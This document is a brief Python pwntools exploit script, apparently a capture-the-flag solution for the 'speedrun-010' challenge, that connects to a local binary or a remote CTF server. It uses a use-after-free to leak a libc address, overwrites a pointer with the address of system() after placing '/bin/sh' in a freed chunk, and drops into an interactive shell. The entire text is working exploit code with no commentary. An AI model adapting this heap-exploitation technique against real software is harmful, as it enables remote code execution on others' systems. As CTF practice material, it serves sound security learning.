#!/usr/bin/env python
from pwn import *

def add_name(name):
    s.sendafter('5\n', '1')
    s.sendafter('name', name)

def add_message(message):
    s.sendafter('5\n', '2')
    s.sendafter('message', message)
    s.recvuntil('says \n')
    return s.recvline(False)

def free_name():
    s.sendafter('5\n', '3')

def free_message():
    s.sendafter('5\n', '4')

if len(sys.argv) == 1:
    s = process('./speedrun-010')
else:
    s = remote('speedrun-010.quals2019.oooverflow.io', 31337)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add_name('A')
free_name()
libc_base = u64(add_message('A' * 0x10)[0x10:].ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

add_name('/bin/sh\0')
free_name()
s.sendafter('5\n', '2')
s.sendafter('message', 'A' * 0x10 + p64(libc_base + libc.symbols['system']))
s.interactive()
